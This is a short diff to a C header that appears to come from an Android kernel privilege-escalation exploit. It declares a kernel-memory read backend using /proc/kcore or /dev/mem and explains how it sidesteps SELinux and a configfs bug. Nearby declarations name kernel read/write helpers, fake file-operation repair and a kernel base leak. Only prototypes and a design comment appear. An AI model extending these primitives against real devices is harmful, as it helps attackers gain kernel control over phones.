@@ -444,6 +444,22 @@ uint64_t kernel_read64(int fd, uintptr_t target);
 ssize_t kernel_write_data(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
+
+/*
+ * Independent kernel-read backend for leak_task_struct() (mm_struct -> task_struct).
+ * Does NOT use ashmem/configfs (those are broken on jinghu: SELinux blocks
+ * /dev/ashmem in the shell domain + configfs_read_once needs_read_fill bug).
+ * Picks the first usable primitive at runtime:
+ *   - /proc/kcore  : ELF core view, direct kernel-virtual reads (preferred)
+ *   - /dev/mem     : STRICT_DEVMEM unset -> raw physical read; linear-map
+ *                    vaddr is converted to phys via DIRECT_MAP_BASE
+ * Call kread_open() once, then kread64(vaddr) as many times as needed.
+ */
+int kread_open(void);
+void kread_close(void);
+int kread_ready(void);
+uint64_t kread64(uintptr_t vaddr);
+
 int repair_fake_fops_llseek(int fd);
 int refresh_fake_fops_text(int fd);
 int leak_kernel_base(int fd);
